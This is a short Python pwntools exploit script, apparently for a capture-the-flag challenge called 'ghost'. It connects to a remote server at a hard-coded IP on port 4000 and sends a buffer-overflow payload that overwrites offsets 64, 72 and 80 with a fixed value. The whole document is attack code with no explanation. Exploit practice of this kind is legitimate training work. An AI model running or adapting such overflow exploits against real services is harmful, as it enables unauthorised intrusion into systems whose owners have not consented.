from pwn import * 

exe = context.binary = ELF('ghost')

io = remote('139.144.184.150', 4000) #exe.process()
payload = fit({
    64: 0x44434241,
    72: 0x44434241,
    80: 0x44434241,

})
io.recvuntil(b'Mansion')
io.sendline(payload)
io.sendlineafter(b'ghost code: ', payload)
resp = io.recv()

print(resp)
